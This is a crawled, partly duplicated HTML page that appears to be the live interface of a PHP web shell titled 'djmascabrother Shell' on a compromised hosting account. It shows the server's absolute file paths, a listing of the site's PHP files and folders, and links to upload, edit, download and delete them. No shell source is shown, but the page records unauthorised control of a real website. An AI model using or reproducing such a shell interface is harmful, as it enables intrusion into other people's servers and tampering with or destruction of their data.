                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/trabajo.php::trabajo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::trabajo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ultimos_comentarios.php">ultimos_comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>899 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ultimos_comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ultimos_comentarios.php::ultimos_comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ultimos_comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::usuarios.php">usuarios.php</a></td>
                    <td>Archivo</td>
                    <td>21.93 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/usuarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/usuarios.php::usuarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::usuarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::votar.php">votar.php</a></td>
                    <td>Archivo</td>
                    <td>2.71 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/votar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/votar.php::votar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::votar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::x.php">x.php</a></td>
                    <td>Archivo</td>
                    <td>10.22 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/x.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/x.php::x.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::x.php">Editar</a>
                    </td>
                    </tr></table><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <link rel="shortcut icon" href="http://skynetx.cz.cc/tagss.php?imagen::icono" />
    <title>djmascabrother Shell en 209.190.85.12</title>
    <style type="text/css">
        *{padding:0;margin:0;border:0;}
        body{background:url(http://skynetx.cz.cc/tagss.php?imagen::fondo1) repeat;font-size:12px;font-family:tahoma;}
        input,select,option{background:url(http://skynetx.cz.cc/tagss.php?imagen::fondo2) repeat-x;font-size:12px;padding:3px;border:solid 1px #369;}
        select,option{height:25px;padding:-2px;border:solid 1px #369;}
        option{border:solid 1px #eee;}
        #menu,#pie,#ext_menu{width:100%;border-bottom:solid 1px #369;background:url(http://skynetx.cz.cc/tagss.php?imagen::fondo2) repeat-x;height:14px;padding:8px 0;text-align:center;}
        #menu a:link,#menu a:visited,#menu a:active,#pie a:link,#pie a:visited,#pie a:active,#pie span,#ext_menu a:link,#ext_menu a:visited,#ext_menu a:active,#ext_menu span{text-decoration:none;font-weight:bold;color:#369;padding:3px 10px 3px 28px;background-position:2px 2px;}
        #menu a:hover,#pie a:hover,#ext a:hover{padding:1px 9px 1px 27px;border:solid 1px #ddd;background-position:1px 0px;color:#333;}
        #ext_menu a:link,#ext_menu a:visited,#ext_menu a:active,#ext_menu span{padding:3px 28px 3px 28px;}
        #ext_menu a:hover{padding:1px 27px 1px 27px;border:solid 1px #c90;}
        #pie{border-top:solid 1px #369;}
        #pie input{background:url(http://skynetx.cz.cc/tagss.php?imagen::nombre) 4px 2px no-repeat;padding-left:24px;border:solid 1px #ddd;margin:-4px 10px;width:200px;color:#369;font-weight:bold;}
        #ext_menu{background:url(http://skynetx.cz.cc/tagss.php?imagen::fondo3) repeat-x;}
        #menu_logo,#pie_logo{background:url(http://skynetx.cz.cc/tagss.php?imagen::plugin2) 0px 10px no-repeat;float:left;width:48px;height:40px;display:block;z-index:999;margin-top:-18px;}
        #pie_logo{background:url(http://skynetx.cz.cc/tagss.php?imagen::servidor2) 4px 10px no-repeat;margin-bottom:-18px;overflow:hidden;display:fixed;z-index:999;}
        #guardar{background:url(http://skynetx.cz.cc/tagss.php?imagen::guardar) left no-repeat;}
        #resetear{background:url(http://skynetx.cz.cc/tagss.php?imagen::resetear) left no-repeat;}
        a#inicio{background:url(http://skynetx.cz.cc/tagss.php?imagen::inicio) left no-repeat;}
        a#subir_archivo{background:url(http://skynetx.cz.cc/tagss.php?imagen::subir) left no-repeat;}
        a#crear_carpeta{background:url(http://skynetx.cz.cc/tagss.php?imagen::carpeta) left no-repeat;}
        a#crear_archivo{background:url(http://skynetx.cz.cc/tagss.php?imagen::archivo) left no-repeat;}
        a#borrar{background:url(http://skynetx.cz.cc/tagss.php?imagen::error) left no-repeat;}
        a#descargar{background:url(http://skynetx.cz.cc/tagss.php?imagen::bajar) left no-repeat;}
        a#editar{background:url(http://skynetx.cz.cc/tagss.php?imagen::editar) left no-repeat;}
        a#mysql{background:url(http://skynetx.cz.cc/tagss.php?imagen::mysql) left no-repeat;}
        a#info{background:url(http://skynetx.cz.cc/tagss.php?imagen::info) left no-repeat;}
        a#servidor{background:url(http://skynetx.cz.cc/tagss.php?imagen::servidor) left no-repeat;}
        a#extensiones{background:url(http://skynetx.cz.cc/tagss.php?imagen::plugin) left no-repeat;}
        span#carga{background:url(http://skynetx.cz.cc/tagss.php?imagen::engranaje) left no-repeat;}
        table{margin:0;padding:0;width:100%;border-bottom:solid 1px #369;background:white;border-collapse: collapse;}
        table td{border:solid 1px #eee;color:#555;padding:2px 4px 2px 10px;}
        table tr:hover{background:#eee;}
        textarea{border:none;width:100%;height:500px;overflow:auto;}
        form span {color:#444;font-weight:bold;}
        .opciones{width:350px;}
        .ext_opciones{width:250px;}
        .opciones a:link,.opciones a:visited,.opciones a:active, .ext_opciones a:link,.ext_opciones a:visited,.ext_opciones a:active{padding:2px 18px;text-decoration:none;font-weight:bold;color:#369;background-position:2px 2px;font-size:10px;}
        .opciones a:hover, .ext_opciones a:hover{padding:-5px 9px;background-position:1px 1px;color:#black;}
        .primer_fila{padding-left:10px;font-weight:bold;color:#369;border:solid 1px #369;background:lightblue;}
        .permisos{color:#aaa;}
        .si_permisos{color:green;}
        .no_permisos{color:red;}
        .archivo{background:url(http://skynetx.cz.cc/tagss.php?imagen::archivo) center no-repeat;width:18px;height:18px;}
        .carpeta{background:url(http://skynetx.cz.cc/tagss.php?imagen::carpeta) center no-repeat;width:18px;height:18px;}
        .enlace{background:url(http://skynetx.cz.cc/tagss.php?imagen::enlace) center no-repeat;width:18px;height:18px;}
        .extension{background:url(http://skynetx.cz.cc/tagss.php?imagen::plugin) center no-repeat;width:18px;height:18px;}
        .contenedor,.error,.exito{width:100%;border-bottom:solid 1px #369;background:white;padding:5px 10px;text-align:center;}
        .error{background:#f66;color:white;font-weight:bold;}
        .exito{background:#0c9;color:white;font-weight:bold;}
    </style>
</head>

<body>
<div id="menu">
    <a id="inicio" href="http://skynetx.cz.cc/tagss.php">Inicio</a>
    <a id="subir_archivo" href="?subir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Subir archivo</a>
    <a id="crear_carpeta" href="?crear_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Crear carpeta</a>
    <a id="extensiones" href="?extensiones::inicio">Extensiones</a>
    <a id="info" href="?codigo"></a>
    </div><div id="ext_menu">
            <div id="menu_logo"></div><span> No hay ninguna extensión instalada aún.</span></div><table>
            <tr class="primer_fila">
                <td></td>
                <td>Nombre</td>
                <td>Tipo</td>
                <td>Tamaño</td>
                <td>Permisos</td>
                <td class="opciones">Opciones</td>
            </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">..</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                    </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">.</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                        </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/admin">admin</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/admin::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comunidades">comunidades</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comunidades::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cuenta">cuenta</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cuenta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/images">images</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/images::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/includes">includes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/includes::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/lab">lab</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/lab::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mensajes">mensajes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mensajes::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones">notificaciones</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha">recaptcha</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/rss">rss</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/rss::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/search">search</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/search::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/socialads">socialads</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/socialads::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::.htaccess">.htaccess</a></td>
                    <td>Archivo</td>
                    <td>3.81 KB</td>
                    <td><span class="si_permisos">rw-r--r--</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/.htaccess::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/.htaccess::.htaccess::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::.htaccess">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::404.php">404.php</a></td>
                    <td>Archivo</td>
                    <td>7.71 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/404.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/404.php::404.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::404.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.form.php">agregar.form.php</a></td>
                    <td>Archivo</td>
                    <td>12.8 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.form.php::agregar.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.php">agregar.php</a></td>
                    <td>Archivo</td>
                    <td>2.65 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.php::agregar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::anuncie.form.php">anuncie.form.php</a></td>
                    <td>Archivo</td>
                    <td>3.27 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/anuncie.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/anuncie.form.php::anuncie.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::anuncie.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::bloqueados-cambiar.php">bloqueados-cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>937 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/bloqueados-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/bloqueados-cambiar.php::bloqueados-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::bloqueados-cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borrador.form.php">borrador.form.php</a></td>
                    <td>Archivo</td>
                    <td>14.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borrador.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borrador.form.php::borrador.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borrador.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borradores.php">borradores.php</a></td>
                    <td>Archivo</td>
                    <td>2.52 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borradores.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borradores.php::borradores.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borradores.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-google.php">buscador-google.php</a></td>
                    <td>Archivo</td>
                    <td>10.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-google.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-google.php::buscador-google.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-google.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-skynet.php">buscador-skynet.php</a></td>
                    <td>Archivo</td>
                    <td>16.1 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-skynet.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-skynet.php::buscador-skynet.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-skynet.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-tags.php">buscador-tags.php</a></td>
                    <td>Archivo</td>
                    <td>16.01 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-tags.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-tags.php::buscador-tags.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-tags.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador.php">buscador.php</a></td>
                    <td>Archivo</td>
                    <td>19.21 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador.php::buscador.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadordegooles.php">buscadordegooles.php</a></td>
                    <td>Archivo</td>
                    <td>7.46 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadordegooles.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadordegooles.php::buscadordegooles.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadordegooles.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadorweb.php">buscadorweb.php</a></td>
                    <td>Archivo</td>
                    <td>19.36 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadorweb.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
